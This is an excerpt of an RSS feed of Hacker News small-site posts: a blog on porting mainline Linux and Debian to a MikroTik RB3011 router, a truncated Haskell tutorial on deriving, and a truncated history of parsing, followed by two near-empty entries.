<br/>
September 21, 2020 | https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html | <a href="https://web.archive.org/web/*/https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>I upgraded my home internet connection to fibre (FTTP) <a href="https://www.earth.li/~noodles/blog/2019/10/native-ipv6-fttp.html">last October</a>. I’m still on an 80M/20M service, so it’s no faster than my old VDSL FTTC connection was, and as a result for a long time I continued to use my HomeHub 5A running <a href="https://openwrt.org/">OpenWRT</a>. However the FTTP ONT meant I was using up an additional ethernet port on the router, and I was already short, so I ended up with a GigE switch in use as well. Also my wifi is handled by a <a href="https://unifi-network.ui.com/">UniFi</a>, which takes its power via Power-over-Ethernet. That mean I had a router, a switch and a PoE injector all in close proximity. I wanted to reduce the number of devices, and ideally upgrade to something that could scale once I decide to upgrade my FTTP service speed.</p>

<p>Looking around I found the <a href="https://mikrotik.com/product/RB3011UiAS-RM">MikroTik RB3011UiAS-RM</a>, which is a rack mountable device with 10 GigE ports (plus an SFP slot) and a dual core <a href="https://www.qualcomm.com/products/ipq8064">Qualcomm IPQ8064</a> ARM powering it. There’s 1G RAM and 128MB NAND flash, as well as a USB3 port. It also has PoE support. On paper it seemed like an ideal device. I wasn’t particularly interested in running RouterOS on it (the provided software), but that’s based on Linux and there was some work going on within OpenWRT to add support, so it seemed like a worthwhile platform to experiment with (what, you expected this to be about me buying an off the shelf device and using it with only the supplied software?). As an added bonus a friend said he had one he wasn’t using, and was happy to sell it to me for a bargain price.</p>

<p><img alt="RB3011 router in use" src="https://www.earth.li/~noodles/blog/images/2020/rb3011.jpg"></p>

<p>I did try out RouterOS to start with, but I didn’t find it particularly compelling. I’m comfortable configuring firewalling and routing at a Linux command line, and I run some additional services on the router like my <a href="https://www.earth.li/~noodles/blog/2018/05/mqtt-broker.html">MQTT</a> broker, and <a href="https://www.earth.li/~noodles/blog/2018/09/netlink-arp-presence.html">mqtt-arp</a>, my wifi device presence monitor. I could move things around such that they ran on the <a href="https://www.earth.li/~noodles/blog/2019/07/upgrading-the-house-server.html">house server</a>, but I consider them core services and as a result am happier with them on the router.</p>

<p>The first step was to get something booting on the router. Luckily it has an RJ45 serial console port on the back, and a reasonably featured bootloader that can manage to boot via tftp over the network. It wants an ELF binary rather than a plain kernel, but Sergey Sergeev had done the hard work of getting <a href="https://github.com/adron-s/uboot-ipq806x">u-boot working for the IPQ8064</a>, which mean I could just build normal u-boot images to try out.</p>

<p>Linux upstream already had basic support for a lot of the pieces I was interested in. There’s a slight fudge around <code>AUTO_ZRELADDR</code> because the network coprocessors want a chunk of memory at the start of RAM, but there’s ongoing discussions about how to handle this cleanly that I’m hopeful will eventually mean I can drop that hack. Serial, ethernet, the QCA8337 switches (2 sets of 5 ports, tied to different GigE devices on the processor) and the internal NOR all had drivers, so it was a matter of crafting an appropriate DTB to get them working. That left niggles.</p>

<p>First, the second switch is hooked up via SGMII. It turned out the IPQ806x <code>stmmac</code> driver didn’t initialise the clocks in this mode correctly, and neither did the <code>qca8k</code> switch driver. So I need to fix up both of those (Sergey had handled the stmmac driver, so I just had to clean up and submit his patch). Next it turned out the driver for talking to the Qualcomm firmware (SCM) had been updated in a way that broke the old method needed on the IPQ8064. Some git archaeology figured that one out and provided a solution. Ansuel Smith helpfully provided the DWC3 PHY driver for the USB port. That got me to the point I could put a Debian armhf image onto a USB stick and mount that as root, which made debugging much easier.</p>

<p>At this point I started to play with configuring up the device to actually act as a router. I make use of a number of VLANs on my home network, so I wanted to make sure I could support those. Turned out the stmmac driver wasn’t happy reconfiguring its MTU because the IPQ8064 driver doesn’t configure the FIFO sizes. I found what seem to be the correct values and plumbed them in. Then the <code>qca8k</code> driver only supported port bridging. I wanted the ability to have a trunk port to connect to the upstairs switch, while also having ports that only had a single VLAN for local devices. And I wanted the switch to handle this rather than requiring the CPU to bridge the traffic. Thankfully it’s easy to find a copy of the QCA8337 datasheet and the kernel <a href="https://www.kernel.org/doc/html/latest/networking/dsa/index.html">Distributed Switch Architecture</a> is pretty flexible, so I was able to implement the necessary support.</p>

<p>I stuck with Debian on the USB stick for actually putting the device into production. It makes it easier to fix things up if necessary, and the USB stick allows for a full Debian install which would be tricky on the 128M of internal NAND. That means I can use things like <a href="https://wiki.nftables.org/">nftables</a> for my firewalling, and use the standard Debian packages for things like <a href="https://collectd.org/">collectd</a> and <a href="https://mosquitto.org/">mosquitto</a>. Plus for debug I can fire up things like tcpdump or tshark. Which ended up being useful because when I put the device into production I started having weird IPv6 issues that turned out to be a lack of proper Ethernet multicast filter support in the IPQ806x ethernet device. The driver would try and setup the multicast filter for the IPv6 NDP related packets, but it wouldn’t actually work. The fix was to fall back to just receiving all multicast packets - this is what the vendor driver does.</p>

<p>Most of this work will be present once the 5.9 kernel is released - the basics are already in 5.8. Currently not queued up that I can think of are the following:</p>

<ul>
  <li>stmmac IPQ806x FIFO sizes. I sent out an RFC patch for these, but didn’t get any replies. I probably just need to submit this.</li>
  <li>NAND. This is missing support for the QCOM ADM DMA engine. I’ve sent out the patch I found to enable this, and have had some feedback, so I’m hopeful it will get in at some point.</li>
  <li>LCD. AFAICT LCD is an ST7735 device, which has kernel support, but I haven’t spent serious effort getting the SPI configuration to work.</li>
  <li>Touchscreen. Again, this seems to be a zt2046q or similar, which has a kernel driver, but the basic attempts I’ve tried don’t get any response.</li>
  <li>Proper SFP functionality. The IPQ806x has a PCS module, but the stmmac driver doesn’t have an easy way to plumb this in. I have ideas about how to get it working properly (and it can be hacked up with a fixed link config) but it’s not been a high priority.</li>
  <li>Device tree additions. Some of the later bits I’ve enabled aren’t yet in the mainline RB3011 DTB. I’ll submit a patch for that at some point.</li>
</ul>

<p>Overall I consider the device a success, and it’s been entertaining getting it working properly. I’m running a mostly mainline kernel, it’s handling my house traffic without breaking a sweat, and the fact it’s running Debian makes it nice and easy to throw more things on it as I desire. However it turned out the RB3011 isn’t as perfect device as I’d hoped. The PoE support is passive, and the UniFi wants 802.1af. So I was going to end up with 2 devices. As it happened I picked up a cheap <a href="https://eu.dlink.com/uk/en/products/dgs-1210-series-gigabit-smart-plus-switches">D-Link DGS-1210-10P</a> switch, which provides the PoE support as well as some additional switch ports. Plus it runs Linux, so more on that later…</p>

  </article></div>]]>
            </description>
            <link>https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550846</guid>
            <pubDate>Tue, 22 Sep 2020 04:27:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategic Deriving]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24550792">thread link</a>) | @todsacerdoti
<br/>
September 21, 2020 | https://kowainik.github.io/posts/deriving | <a href="https://web.archive.org/web/*/https://kowainik.github.io/posts/deriving">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
              <div>
              <div>
<p>A vision without a <strong>strategy</strong> remains an illusion.</p>

</div>
<h2 id="intro">Intro<a href="#intro">🔗</a></h2>
<p>Hardly anybody enjoys writing and maintaining boilerplate. Developers are trying to come up with more and more techniques and approaches to avoid humdrum repeating of their own code.</p>
<p>Haskell has some unique and powerful ways to get rid of the error-prone boilerplate by design. And here, we would like to focus on one particular compiler feature — <strong>the deriving mechanism</strong>.</p>
<p>Nowadays, it is impossible to imagine any production Haskell project without using automatic deriving. If you saw in code the pretty common <code>deriving (Show, Eq)</code> line, this is one of the examples of the feature in action. And there are strong reasons for the <code>deriving</code> to be so widespread and essential, but most importantly, it helps to reduce unnecessary duplication and makes code more consistent and clear.</p>
<p>But what exactly is <strong>deriving</strong>, how does it work and what pitfalls can it bring? What are <strong>deriving strategies</strong> and how do you get a habit of using them regularly?</p>
<p>In this post, we will get answers to all these questions, speak a bit more about means of deriving mechanisms, their detailed exploration and explanation on the importance of deriving strategies. The <a href="#best-practices-with-deriving">Best Practices</a> section contains a lot of useful tips on how to manage deriving in your code, and what is the current standard. So whether you are a Haskell beginner or more experienced user, this post could be helpful and may even become your pocketbook for deriving (let’s be ambitious).</p>
<h2 id="typeclasses-and-instances">Typeclasses and Instances<a href="#typeclasses-and-instances">🔗</a></h2>
<p>To start the discussion about <strong>deriving</strong>, it is important to understand a few underlying concepts that are crucial for the deriving per se. Feel free to skip to the next section if you are already comfortable with the concept of typeclasses and instances.</p>
<p><u> <strong>Typeclass</strong> </u> is a regularly used way to express common characteristics of the different data types. In some sense, a typeclass describes the interface of some value without telling you the implementation details.</p>
<p><u> <strong>Instance</strong> </u> is a representation of the typeclass ↔︎️ data type relationships. In order to show that the data type obeys the typeclasses rules and to use the methods of the typeclass on the data values, you need to provide the work instructions under this particular typeclass. And that is the instance of the data type for the particular typeclass.</p>
<hr>
<p>Let’s consolidate the typeclasses and instances concepts on the analogues from real life.</p>
<h4 id="santa-letters">Santa letters<a href="#santa-letters">🔗</a></h4>
<p>When a little child writes a letter to Santa, they describe what toy they want, e.g.&nbsp;cute, plush, cartoon-character-alike. These toy properties can be interpreted as typeclasses. They exist independently from the actual toy. At the same time, you can characterise a toy like <em>plush bear</em> by different qualities: plush, animal, smiling, etc. A letter to Santa is a function implemented in terms of some typeclasses and, depending on toy characteristics, Santa will choose a perfect match for a kid.</p>
<h4 id="haskell-reports">Haskell Reports<a href="#haskell-reports">🔗</a></h4>
<p>A more technical example is Haskell Report VS Haskell compiler. A Haskell report describes what every Haskell compiler must be able to do, and the report is not talking about any particular Haskell compiler. A compiler is a data type, and the report is a typeclass. And if a compiler implements the whole report, you can say that the compiler is an instance of the report.</p>
<h4 id="countable-sets">Countable sets<a href="#countable-sets">🔗</a></h4>
<p>And here is a math typeclass-instance reference for math lovers: sets of numbers (naturals, rationals, etc.) and set properties. For example, math defines an object called <em>countable set</em> that has an infinite number of elements. Using this properly you can prove different theorems or deduce new properties. You don’t even need to have a real object satisfying this property! But if you have such an object, you get all the proven theorems and properties automatically for your object.</p>
<hr>
<p>Let’s look at one code example for the better illustration of the instance-typeclass relationship. We can define a typeclass that would tell us whether you were a nice or naughty child this year</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>data</span> <span>Behaviour</span></span>
<span id="cb1-2">    <span>=</span> <span>Naughty</span></span>
<span id="cb1-3">    <span>|</span> <span>Nice</span></span>
<span id="cb1-4"></span>
<span id="cb1-5"><span>class</span> <span>YearBehaviour</span> a <span>where</span></span>
<span id="cb1-6"><span>    yearBehaviour ::</span> a <span>-&gt;</span> <span>Behaviour</span></span></code></pre></div>
<p>And that <code>yearBehaviour</code> method could be used with a lot of data types: <code>Int</code>, <code>Double</code>,… name them all! Let’s have our first instances to show how it works:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>instance</span> <span>YearBehaviour</span> <span>Int</span> <span>where</span></span>
<span id="cb2-2"><span>    yearBehaviour ::</span> <span>Int</span> <span>-&gt;</span> <span>Behaviour</span></span>
<span id="cb2-3">    yearBehaviour <span>0</span> <span>=</span> <span>Naughty</span></span>
<span id="cb2-4">    yearBehaviour _ <span>=</span> <span>Nice</span></span>
<span id="cb2-5"></span>
<span id="cb2-6"><span>instance</span> <span>YearBehaviour</span> <span>Double</span> <span>where</span></span>
<span id="cb2-7"><span>    yearBehaviour ::</span> <span>Double</span> <span>-&gt;</span> <span>Behaviour</span></span>
<span id="cb2-8">    yearBehaviour n</span>
<span id="cb2-9">        <span>|</span> <span>isNaN</span> n <span>||</span> <span>isInfinite</span> n <span>=</span> <span>Naughty</span></span>
<span id="cb2-10">        <span>|</span> <span>otherwise</span> <span>=</span> <span>Nice</span></span></code></pre></div>
<p>And then you can write polymorphic functions and not worry about which specific type is underhood until it has the instance of the desired typeclass:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>canHaveChristmasGift ::</span> <span>YearBehaviour</span> a <span>=&gt;</span> a <span>-&gt;</span> <span>Text</span></span>
<span id="cb3-2">canHaveChristmasGift x <span>=</span> <span>case</span> yearBehaviour x <span>of</span></span>
<span id="cb3-3">    <span>Nice</span>    <span>-&gt;</span> <span>"Ho-ho-ho! Looks like somebody deserves a toy!"</span></span>
<span id="cb3-4">    <span>Naughty</span> <span>-&gt;</span> <span>"You were naughty this year! Better luck next year ;)"</span></span></code></pre></div>
<p>This is how it works in action:</p>
<div id="cb4"><pre><code><span id="cb4-1">ghci<span>&gt;</span> canHaveChristmasGift (<span>42</span><span> ::</span> <span>Int</span>)</span>
<span id="cb4-2"><span>"Ho-ho-ho! Looks like somebody deserves a toy!"</span></span>
<span id="cb4-3">ghci<span>&gt;</span> canHaveChristmasGift (<span>0</span> <span>/</span> <span>0</span><span> ::</span> <span>Double</span>)</span>
<span id="cb4-4"><span>"You were naughty this year! Better luck next year ;)"</span></span></code></pre></div>
<p>However, if we try to use this function with something that doesn’t implement any instance of our typeclass, we will get the corresponding compiler error, that would warn us exactly about that:</p>
<div id="cb5"><pre><code><span id="cb5-1">ghci<span>&gt;</span> canHaveChristmasGift (<span>"Trust me, I am nice!"</span><span> ::</span> <span>Text</span>)</span>
<span id="cb5-2"></span>
<span id="cb5-3"><span>&lt;</span>interactive<span>&gt;:</span><span>21</span><span>:</span><span>1</span><span>:</span> <span>error</span><span>:</span></span>
<span id="cb5-4">    • <span>No</span> <span>instance</span> for (<span>YearBehaviour</span> <span>Text</span>)</span>
<span id="cb5-5">        arising from a use <span>of</span> ‘canHaveChristmasGift’</span>
<span id="cb5-6">    • <span>In</span> the expression<span>:</span> canHaveChristmasGift <span>"Trust me, I am nice!"</span></span>
<span id="cb5-7">      <span>In</span> an equation for ‘it’<span>:</span> it <span>=</span> canHaveChristmasGift <span>"Trust me, I am nice!"</span></span></code></pre></div>
<p>Now when we know the above information about type classes and how they work, we may look at what deriving gives us and how it is connected.</p>
<h2 id="motivation">Motivation<a href="#motivation">🔗</a></h2>
<p>Without further ado, <strong>deriving</strong> is the mechanism of automatically generating typeclass instances for data types by a compiler.</p>
<p>The fair question here is why one may need to generate instances automatically? Let’s try to get an answer to this one.</p>
<p>For instance, we have the gift system for Santa’s <em>“Christmas”</em> operation, and we define the following data types in our system:</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>data</span> <span>Gift</span> <span>=</span> <span>Gift</span></span>
<span id="cb6-2">    {<span> giftId   ::</span> <span>Int</span></span>
<span id="cb6-3">    ,<span> giftType ::</span> <span>GiftType</span></span>
<span id="cb6-4">    }</span>
<span id="cb6-5"></span>
<span id="cb6-6"><span>data</span> <span>GiftType</span></span>
<span id="cb6-7">    <span>=</span> <span>Candies</span> <span>CandyCounter</span></span>
<span id="cb6-8">    <span>|</span> <span>Toy</span> <span>Name</span></span>
<span id="cb6-9"></span>
<span id="cb6-10"><span>newtype</span> <span>Name</span> <span>=</span> <span>Name</span></span>
<span id="cb6-11">    {<span> unName ::</span> <span>Text</span></span>
<span id="cb6-12">    }</span>
<span id="cb6-13"></span>
<span id="cb6-14"><span>newtype</span> <span>CandyCounter</span> <span>=</span> <span>CandyCounter</span></span>
<span id="cb6-15">    {<span> unCandyCounter ::</span> <span>Int</span></span>
<span id="cb6-16">    }</span></code></pre></div>
<p>And now we want to compare two gifts — two values of the <code>Gift</code> data type (e.g., we may need it to prepare the most deserved presents depending on the child’s behaviour).</p>
<p>We can, of course, write the special function <code>compareGifts :: Gift -&gt; Gift -&gt; Ordering</code>. But, generally, it’s a good practice to provide a more polymorphic interface when possible. And here it is definitely possible!</p>
<p>One can notice that our data types would benefit from instances of the general comparison typeclass <code>Ord</code>, which already includes many comparison functions and the ecosystem nicely integrates with it. So, let’s go ahead and write some instances.</p>
<p>If we look at the <code>Ord</code> typeclass definition, we can see that it demands the data type to have the <code>Eq</code> instance too. That means we should implement it first.</p>
<p>We also can verify in the docs, that the standard type <code>Int</code> already has both <code>Eq</code> and <code>Ord</code> instances. At least we don’t need to define instances for primitive data types, phew! However, the newtype that we defined manually is not the same as <code>Int</code> even though it has the same runtime representation (because it is a newtype). For each newtype introduced we need to somehow define the instance too.</p>
<p>So, taking all of that under consideration, to solve our problem, we must write:</p>
<ul>
<li><code>Eq</code> instance for the <code>CandyCounter</code> newtype</li>
<li><code>Ord</code> instance for the <code>CandyCounter</code> newtype</li>
<li><code>Eq</code> instance for the <code>Name</code> newtype</li>
<li><code>Ord</code> instance for the <code>Name</code> newtype</li>
<li><code>Eq</code> instance for the <code>GiftType</code> data type</li>
<li><code>Ord</code> instance for the <code>GiftType</code> data type</li>
<li><code>Eq</code> instance for the <code>Gift</code> data type</li>
<li><code>Ord</code> instance for the <code>Gift</code> data type</li>
</ul>
<p>And only after that, we will be able to use the <code>compare</code> function with gifts.</p>
<p>Writing all those instances by hand is quite tedious work. Besides, such work creates more work — a lot of code to maintain for the future you and your colleagues. Imagine that you need to go through the above cycle again when you slightly change anything in your data types. What a nightmare that could be!</p>
<p>Besides boredom, it could bring pain and lead to some dummy errors like this one:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>instance</span> <span>Eq</span> <span>MyChangedType</span> <span>where</span></span>
<span id="cb7-2">    <span>MyChangedType</span> a1 b1 (<span>Xxx</span> c1 c2) <span>==</span> <span>MyChangedType</span> a2 b2 (<span>Xxx</span> d1 d2) <span>=</span></span>
<span id="cb7-3">           a1 <span>==</span> a2</span>
<span id="cb7-4">        <span>&amp;&amp;</span> b1 <span>==</span> b2</span>
<span id="cb7-5">        <span>&amp;&amp;</span> c1 <span>==</span> c2</span>
<span id="cb7-6">        <span>&amp;&amp;</span> d1 <span>==</span> d2</span></code></pre></div>
<p>Can you see what is wrong with this instance? Indeed, you can notice the mistake after looking at the instance for a while, but this is just an example. It could be a bit more tricky to notice in real-life code, so you should be extra careful in manual instance declaration and maintenance.</p>
<p>So, with all that in mind, we are coming to the interesting part, the part why we are all here. Here comes the deriving!</p>
<h2 id="deriving">Deriving<a href="#deriving">🔗</a></h2>
<p>As we already said, the <strong>deriving</strong> mechanism is the compiler feature that automatically generates the instances of some typeclasses for you. There are different ways of deriving, but the general idea is described by the Haskell language report, which implies that any Haskell compiler should have this feature out of the box.</p>
<p>Citing the Haskell Report 2010:</p>
<div>
<p>A derived instance is an instance declaration that is generated automatically in conjunction with a data or newtype declaration. The body of a derived instance declaration is derived syntactically from the definition of the associated type.</p>
<p>Haskell 2010 Report</p>
</div>
<p>This is a very accurate definition suitable for any kind of deriving. So, it should give you an idea of what is deriving in general.</p>
<blockquote>
<p>☝️ As the deriving mechanism is the part of Haskell language specification, the implementation depends on …</p></blockquote></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kowainik.github.io/posts/deriving">https://kowainik.github.io/posts/deriving</a></em></p>]]>
            </description>
            <link>https://kowainik.github.io/posts/deriving</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550792</guid>
            <pubDate>Tue, 22 Sep 2020 04:18:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsing: A Timeline]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24550559">thread link</a>) | @nsajko
<br/>
September 21, 2020 | https://jeffreykegler.github.io/personal/timeline_v3 | <a href="https://web.archive.org/web/*/https://jeffreykegler.github.io/personal/timeline_v3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <mytitle>Parsing: a timeline</mytitle>
    <version>Version 3.1</version>
    <datestamp>Revision 2, 23 October 2019</datestamp>
    <author>Jeffrey Kegler</author>
    
    <p>In India, Pannini creates an exact and complete description of
      the Sanskrit language, including pronunciation. Sanskrit could be
      recreated using nothing but Pannini's grammar.
      Pannini's grammar is
      probably the first formal system of any kind, predating Euclid.
      In the future, nothing like it will exist for any other natural language of
      significant size or corpus.
      By 2018,
      Pannini will be the object of serious study.
      But in the 1940's and 1950's Pannini will be almost unknown in
      the West.
      This means that Pannini will have no direct effect
      on the other events in this timeline.
    </p>
    
    <p>In her translator's note on an article on Babbage's
    computer, Ada Lovelace becomes the first person to
    clearly distinguish programming a computer (software)
    as a separate field from
    building the computer itself (hardware).<a id="footnote-1-ref" href="#footnote-1">[1]</a>
    Ada is also the first to
    think of software in linguistic terms --
    she originates the idea that,
    in writing software,
    we communicate with the computer,
    and that the means that we use to do that is a "language".<a id="footnote-2-ref" href="#footnote-2">[2]</a>
    </p>
    <blockquote>
     A new, a vast, and a powerful language is developed for the future
     use of analysis, in which to wield its truths so that these may
     become of more speedy and accurate practical application for the
     purposes of mankind than the means hitherto in our possession have
     rendered possible. Thus not only the mental and the material, but
     the theoretical and the practical in the mathematical world, are
     brought into more intimate and effective connexion with each other.<a id="footnote-3-ref" href="#footnote-3">[3]</a>
    </blockquote>
    <p>Here "analysis" means the branch of mathematics that studies limits
    and continuous functions, and which includes calculus.
    </p>
    
    <p>Andrey Markov introduces his
      <term>chains</term>
      -- a set of
      states with transitions between them.<a id="footnote-4-ref" href="#footnote-4">[4]</a>
      One offshoot of Markov's work will be what will
      come to be known as regular expressions.
      Markov uses his chains,
      not for parsing,
      but to deal with a problem in probability --
      does the law of large numbers require that events be
      independent?
      Indirectly, Markov is addressing the question 
      of the existence of free will.<a id="footnote-5-ref" href="#footnote-5">[5]</a>.
    </p>
    
    <p>In 1913, Markov revisits his chains,
      applying them to the sequence of vowels and consonants
      in Pushkin's
      <cite>Eugene Onegin</cite><a id="footnote-6-ref" href="#footnote-6">[6]</a>.
      Again, Markov's interest is not in parsing.
      Nonetheless,
      this is an application to language
      of what later will be regarded
      as a parsing technique,
      and apparently for the first time in the West.
    </p>
    
    <p>Leonard Bloomfield,
      as part of his effort to create a linguistics that
      would be taken seriously as a science,
      publishes his "Postulates".<a id="footnote-7-ref" href="#footnote-7">[7]</a>
      Known as structural linguistics,
      Bloomfield's approach will
      dominate American lingustics for
      over two decades.
    </p>
    
    <p>
      Bloomfield's "Postulates" defines a "language" as
    </p>
    <blockquote>
      [t]he totality of utterances that can be made in a speech
      community<a id="footnote-8-ref" href="#footnote-8">[8]</a>
    </blockquote>
    <p>
      Note that there is no reference in this definition to the usual view --
      that the utterances of a language "mean" something.
    </p>
    <p>
      This omission is not accidental.<a id="footnote-9-ref" href="#footnote-9">[9]</a>
      Bloomfield excludes meaning from his definition of language
      because he wants linguistics to be taken
      seriously as science.
      Behaviorist thought is very influential at this
      time and behavorists believe that,
      while human behaviors can be observed and verified
      and therefore made the subject of science,
      mental states cannot be verified.
      Claiming to know what someone means
      by a word
      is claiming to read his mind.
      And "mind-reading" is not science.
    </p>
    
    <p>Emil Post defines and studies a formal rewriting system<a id="footnote-10-ref" href="#footnote-10">[10]</a>
      using productions.
      With this, the process of rediscovering Pannini in the
      West begins.</p>
    
    <p>Alan Turing discovers the stack as part of his design of the
      ACE machine. This will be important in parsing because recursive parsing
      requires stacks. The importance of Turing's discovery is not noticed
      in 1945 and stacks will be rediscovered many times over the
      next two decades<a id="footnote-11-ref" href="#footnote-11">[11]</a>.
    </p>
    
    <p>Claude Shannon publishes the foundation paper of information theory<a id="footnote-12-ref" href="#footnote-12">[12]</a>.
      In this
      paper, Shannon models English using Andrey Markov's
      chains<a id="footnote-13-ref" href="#footnote-13">[13]</a>.
      The approach is similar to Markov's but the intent
      is different --
      Shannon's is a serious attempt at a contribution
      to parsing human languages.
    </p>
    
    <p>From 1949 to 1951 at the ETH Zurich, Heinz Rutishauser works on
      the design of what we will come to call a compiler<a id="footnote-14-ref" href="#footnote-14">[14]</a>.
      Rutishauser's arithmetic expression parser
      does not honor precedence but it does allow nested parentheses.
      It is perhaps the first algorithm which can really be considered a
      parsing method.
      Rutishauser's compiler is never implemented.</p>
    
    <p>
      In the form of arithmetic expressions, operator expressions
      are the target of the first efforts at automatic parsing.
      We will not see this issue go away.
      Very informally<a id="footnote-15-ref" href="#footnote-15">[15]</a>,
      we can say that
      an operator expression is an expression
      built up from operands
      and operators.
      It is expected that the operand might be another operator expression,
      so operator expressions raise the issue of recursion.
    </p>
    <p>
      The archetypal examples of operator expressions are arithmetic expressions:
    </p><pre><tt>
         2+(3*4)
         13^2^-5*9/11
         1729-42*8675309
      </tt></pre>
    <p>
      In Western mathematics arithmetic expressions have been read
      according to traditional
      ideas of
      associativity and precedence:
    </p><ul>
      <li><tt>^</tt>
        is exponentiation.
        It right associates and has tightest<a id="footnote-16-ref" href="#footnote-16">[16]</a>
        precedence.
      </li>
      <li>
        Multiplication (<tt>*</tt>) and division (<tt>/</tt>) left associate.
        They have a precedence equal to each other
        and less tight than that of exponentiation.
      </li>
      <li>
        Addition ('+') and subtraction ('-') left associate.
        They have a precedence equal to each other
        and less tight than that of multiplication and division.
      </li>
      <li>
        Parentheses, when present, override the traditional
        associativity and precedence.
      </li>
    </ul>
    <p>
      Rutishauser's language
      is structured line-by-line,
      as will be all languages until LISP.
      No language until ALGOL will be truly block-structured.
    </p>
    <p>
      The line-by-line languages
      are parsed using string manipulations.
      A parsing theory is not helpful for describing these
      ad hoc string manipulations,
      so they don't give rise to one.
      The only logic in these early compilers that really deserves to be called
      a parsing method
      is that which tackles arithmetic expressions.
    </p>
    
    <p>During 1950, Corrado Boehm, also at the ETH Zurich,
      develops his own compiler.
      Rutishauser and Boehm are working at the same institution at the same
      time, but Boehm is unaware of Rutishauser's work until his own is
      complete.
      Boehm's is also the first self-compiling compiler -- it is written
      in its own language.
    </p>
    <p>
      Like Rutishauser, Boehm's language is line-by-line and
      parsed ad hoc, except for expressions. Boehm's expression parser
      <em>does</em>
      honor precedence, making it perhaps the first operator precedence
      parser<a id="footnote-17-ref" href="#footnote-17">[17]</a>.
      In Norvell's taxonomy<a id="footnote-18-ref" href="#footnote-18">[18]</a>,
      Boehm's algorithm inaugurates
      the
      <q>classic approach</q>
      to operator parsing.
    </p>
    <p>
      Boehm's compiler also allows parentheses, but the two cannot
      be mixed -- an expression can either be parsed using precedence
      or have parentheses, but not both.
      Also like Rutishauser's, Boehm's compiler is never
      implemented<a id="footnote-19-ref" href="#footnote-19">[19]</a>.
    </p>
    
    <p>Grace Hopper writes a linker-loader,
      and calls it a
      <term>compiler</term><a id="footnote-20-ref" href="#footnote-20">[20]</a>. Hopper seems to be the first
      person to use this term for a computer program.</p>
    
    <p>Hopper uses the term
      <term>compiler</term>
      in a meaning very close to one of its traditional senses:
      <q>to compose out of materials from other
        documents</q><a id="footnote-21-ref" href="#footnote-21">[21]</a>.
      Specifically, in 1952,
      subroutines were new,
      and automated programming
      (what we will come to call
      <q>compiling</q>)
      often is viewed as providing a interface
      for calling a collection of
      carefully chosen assembler subroutines<a id="footnote-22-ref" href="#footnote-22">[22]</a>.
      Hopper's new
      program takes this subroutine calling
      one step further -- instead of calling the subroutines
      it expands them (or in Hopper's terms
      <q>compiles</q>
      them) into
      a single program.
    </p>
    <p>
      After Hopper the term
      <term>compiler</term>
      will acquire a different meaning,
      one specific to the computer field.
      By 1956, programs like Hoppers will
      no longer be called
      <term>compilers</term><a id="footnote-23-ref" href="#footnote-23">[23]</a>.
    </p>
    
    <p>Kleene discovers regular languages<a id="footnote-24-ref" href="#footnote-24">[24]</a>.
      Kleene does not use regular expression notation,
      but his regular languages are the idea behind
      it.
    </p>
    
    <p>
      Glennie discovers what Knuth will later
      call the first
      <q>real</q><a id="footnote-25-ref" href="#footnote-25">[25]</a>
      compiler.
      (By this Knuth will mean that
      AUTOCODE was actually implemented and used by someone to translate
      algebraic statements into machine language.)
      Glennie's AUTOCODE
      is very close to the machine -- just above machine language.
      It does not allow operator expressions.
    </p>
    <p>
      AUTOCODE is hard-to-use,
      and apparently sees little use by anybody but
      Glennie himself.
      Because
      Glennie works for the British atomic weapons projects his papers
      are routinely classified,</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jeffreykegler.github.io/personal/timeline_v3">https://jeffreykegler.github.io/personal/timeline_v3</a></em></p>]]>
            </description>
            <link>https://jeffreykegler.github.io/personal/timeline_v3</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550559</guid>
            <pubDate>Tue, 22 Sep 2020 03:31:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The PDP-1]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24550476">thread link</a>) | @bilegeek
<br/>
September 21, 2020 | https://www.computer-history.info/Page4.dir/pages/PDP.1.dir/ | <a href="https://web.archive.org/web/*/https://www.computer-history.info/Page4.dir/pages/PDP.1.dir/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.computer-history.info/Page4.dir/pages/PDP.1.dir/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24550476</guid>
            <pubDate>Tue, 22 Sep 2020 03:08:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Grafana Overview Dashboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24550258">thread link</a>) | @joshbetz
<br/>
September 21, 2020 | https://josh.blog/2020/09/grafana-overview-dashboard | <a href="https://web.archive.org/web/*/https://josh.blog/2020/09/grafana-overview-dashboard">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="articles">
					<div>
			<article id="post-40917">
				
				<div>
					
					<div>
<p>There should be an “Overview” dashboard for your infrastructure that gives you a quick, high level view of how everything is working. The idea isn’t to necessarily use this for diagnosing problems, but for knowing where to look next. Here’s a quick one I put together for fun.</p>



